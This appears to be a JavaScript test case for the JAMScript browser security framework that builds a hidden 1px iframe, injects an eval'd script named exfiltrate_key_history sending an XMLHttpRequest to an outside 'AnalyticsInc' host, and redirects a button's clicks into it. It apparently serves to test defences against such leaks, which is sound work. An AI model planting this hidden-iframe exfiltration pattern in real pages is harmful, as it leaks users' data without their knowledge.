function click_inner() {
  var event$$1 = new Event("click");
  var v0 = document.getElementById("test2");
  v0.dispatchEvent(event$$1);
  return
}
var v7 = document.head;
var v1 = v7.childNodes;
var pol = v1[5];
var v8 = document.head;
var v2 = v8.childNodes;
var tx = v2[7];
var button = document.getElementById("test");
var button2 = button.cloneNode(true);
button2.id = "test2";
var script = document.createElement("script");
JAMScript.set(script, "innerHTML", "function exfiltrate_key_history() {var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open(\"GET\", \"http://AnalyticsInc:8000/submission.html?test=iframe\", true);xmlhttp.send(null);';eval(exp);}document.getElementById('test2').onclick = exfiltrate_key_history;");
var frm = document.createElement("iframe");
JAMScript.call(frm.setAttribute, frm, ["id", "ifrm"]);
JAMScript.call(frm.setAttribute, frm, ["src", "JavaScript:''"]);
var v3 = frm.style;
v3.width = "1px";
var v4 = frm.style;
v4.height = "1px";
JAMScript.call(frm.appendChild, frm, [tx]);
JAMScript.call(frm.appendChild, frm, [button2]);
JAMScript.call(frm.appendChild, frm, [script]);
var v5 = document.body;
JAMScript.call(v5.appendChild, v5, [frm]);
var v6 = document.getElementById("test");
JAMScript.set(v6, "onclick", click_inner);

